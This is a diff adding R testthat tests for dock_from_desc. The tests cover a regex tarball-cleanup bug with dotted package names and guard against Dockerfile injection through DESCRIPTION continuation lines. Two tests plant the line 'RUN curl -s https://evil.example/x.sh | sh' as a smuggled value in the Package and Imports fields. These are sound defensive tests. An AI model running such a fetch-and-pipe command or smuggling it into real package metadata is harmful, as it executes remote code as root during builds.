@@ -356,6 +356,130 @@ withr::with_dir(
       expect_match(df, "remotes::install_local", fixed = TRUE)
     })
 
+    test_that("dock_from_desc(update_tar_gz = TRUE) does not sweep a sibling package's tarball when the package name contains a dot", {
+      skip_if(is_rdevel, "skip on R-devel")
+      # `list.files(pattern =)` is a regex. With `Package: R.utils`,
+      # `sprintf("%s_.+.tar.gz", "R.utils")` also matches
+      # `RZutils_*.tar.gz` and would `file.remove()` it. Building the
+      # pattern from a glob keeps the dot literal.
+      dot_dir <- tempfile(pattern = "dot-pkg")
+      dir.create(dot_dir)
+      on.exit(unlink(dot_dir, recursive = TRUE), add = TRUE)
+      writeLines(
+        c(
+          "Package: R.utils",
+          "Version: 1.0.0",
+          "Title: Demo",
+          "Description: Demo.",
+          "License: MIT",
+          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))"
+        ),
+        file.path(dot_dir, "DESCRIPTION")
+      )
+      file.create(file.path(dot_dir, "R.utils_0.9.0.tar.gz"))
+      file.create(file.path(dot_dir, "RZutils_0.9.0.tar.gz"))
+      withr::with_dir(dot_dir, {
+        testthat::with_mocked_bindings(
+          code = testthat::with_mocked_bindings(
+            code = dock_from_desc(
+              "DESCRIPTION",
+              build_from_source = FALSE,
+              update_tar_gz = TRUE
+            ),
+            package_deps = function(packages) {
+              data.frame(
+                package = character(0),
+                is_cran = logical(0),
+                installed = character(0),
+                stringsAsFactors = FALSE
+              )
+            },
+            .package = "remotes"
+          ),
+          get_sysreqs = function(...) character(0),
+          build = function(path, dest_path, vignettes) {
+            fake <- file.path(dest_path, "R.utils_1.0.0.tar.gz")
+            file.create(fake)
+            fake
+          },
+          use_build_ignore = function(files) invisible(TRUE)
+        )
+      })
+      # The unrelated sibling tarball must survive.
+      expect_true(file.exists(file.path(dot_dir, "RZutils_0.9.0.tar.gz")))
+      # The package's own old tarball is the one that gets cleaned.
+      expect_false(file.exists(file.path(dot_dir, "R.utils_0.9.0.tar.gz")))
+    })
+
+    test_that("dock_from_desc rejects a DESCRIPTION whose Package field carries a continuation-line injection", {
+      skip_if(is_rdevel, "skip on R-devel")
+      # `read.dcf()` joins DCF continuation lines with `\n`. Without
+      # validation, a `Package:` field with a continuation line is
+      # interpolated into the `COPY <pkg>_*.tar.gz /app.tar.gz` line
+      # generated for `build_from_source = FALSE`, injecting an extra
+      # Dockerfile directive that runs as root at `docker build` time.
+      evil_dir <- tempfile(pattern = "evil-desc")
+      dir.create(evil_dir)
+      on.exit(unlink(evil_dir, recursive = TRUE), add = TRUE)
+      writeLines(
+        c(
+          "Package: app",
+          " RUN curl -s https://evil.example/x.sh | sh #",
+          "Version: 1.0.0",
+          "Title: Demo",
+          "Description: Demo.",
+          "License: MIT",
+          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))"
+        ),
+        file.path(evil_dir, "DESCRIPTION")
+      )
+      expect_error(
+        testthat::with_mocked_bindings(
+          code = dock_from_desc(
+            file.path(evil_dir, "DESCRIPTION"),
+            build_from_source = FALSE,
+            update_tar_gz = FALSE
+          ),
+          get_sysreqs = function(...) character(0)
+        ),
+        "package name"
+      )
+    })
+
+    test_that("dock_from_desc rejects a DESCRIPTION whose Imports field carries a continuation-line injection", {
+      skip_if(is_rdevel, "skip on R-devel")
+      # `desc::desc_get_deps()` joins DCF continuation lines with `\n`
+      # like `read.dcf()`. Without validation, a crafted dependency
+      # name is interpolated into the generated
+      # `remotes::install_version("<name>", ...)` RUN, injecting an
+      # extra Dockerfile directive that runs as root at `docker build`
+      # time -- and this path fires on the default
+      # `build_from_source = TRUE`, not only on the COPY path.
+      evil_dir <- tempfile(pattern = "evil-desc-imports")
+      dir.create(evil_dir)
+      on.exit(unlink(evil_dir, recursive = TRUE), add = TRUE)
+      writeLines(
+        c(
+          "Package: app",
+          "Version: 1.0.0",
+          "Title: Demo",
+          "Description: Demo.",
+          "License: MIT",
+          "Authors@R: person('A', 'B', email = 'a@b.c', role = c('aut', 'cre'))",
+          "Imports:",
+          "    evilpkg",
+          "     RUN curl -s https://evil.example/x.sh | sh #"
+        ),
+        file.path(evil_dir, "DESCRIPTION")
+      )
+      expect_error(
+        testthat::with_mocked_bindings(
+          code = dock_from_desc(file.path(evil_dir, "DESCRIPTION")),
+          get_sysreqs = function(...) character(0)
+        ),
+        "package name"
+      )
+    })
 
     test_that("dock_from_desc messages the user when DESCRIPTION declares SystemRequirements", {
       skip_if(is_rdevel, "skip on R-devel")
